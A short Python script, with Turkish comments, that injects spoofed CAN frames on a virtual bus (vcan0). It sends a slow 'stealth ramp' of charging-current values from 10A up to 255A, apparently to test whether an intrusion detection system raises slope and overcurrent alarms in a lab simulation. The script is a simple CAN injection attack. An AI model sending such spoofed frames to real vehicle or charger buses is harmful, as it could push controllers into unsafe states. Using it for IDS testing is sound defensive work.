# can_attacker_ramp.py
import asyncio
import logging
import can
import time

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] - ATK - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logging.getLogger("Attacker")

try:
    bus = can.interface.Bus('vcan0', interface='socketcan')
    log.info("Saldırgan vcan0 (Kirli Ağ) arayüzüne başarıyla bağlandı.")
except Exception as e: exit(f"Saldırgan vcan0'a bağlanılamadı: {e}")

async def send_can_message(can_id, data):
    try:
        msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
        bus.send(msg)
        log.info(f"CAN Mesajı Gönderildi: ID={hex(can_id)}, Data={data}")
        return True
    except Exception as e: 
        log.error(f"CAN Mesajı gönderilemedi: {e}")
        return False

async def main():
    log.info("Sinsi Kademeli Artış (Stealth Ramp) Testi Başlıyor...")
    
    can_id_current = 0x180 # gateway.py'nin dinlediği ID
    
    # [akım, konektör_id, ...]
    ramp_steps = [
        (10, "Adım 1: Normal Başlangıç (10A)"),
        (15, "Adım 2: Normal Artış (15A, +5A artış) -> IDS: Normal"),
        (30, "Adım 3: ANORMALİ (SLOPE): Hızlı Artış (30A, +15A artış) -> IDS: SLOPE ALARMI"),
        (35, "Adım 4: Normal Artış (35A, +5A artış) -> IDS: Normal (ama limite yakın)"),
        (50, "Adım 5: ANORMALİ (LİMİT): Aşırı Akım (50A) -> IDS: OVERCURRENT ALARMI"),
        (255, "Adım 6: ANORMALİ (LİMİT): Maksimum Saldırı (255A) -> IDS: OVERCURRENT ALARMI")
    ]
    
    for current, comment in ramp_steps:
        log.info(f"== {comment} ==")
        data = [current, 1, 0, 0, 0, 0, 0, 0]
        await send_can_message(can_id_current, data)
        
        # Adımlar arasında "sinsi" olmak için 3 saniye bekle
        await asyncio.sleep(3) 
            
    log.info("Kademeli Saldırı tamamlandı.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        log.info("\nSaldırgan durduruldu.")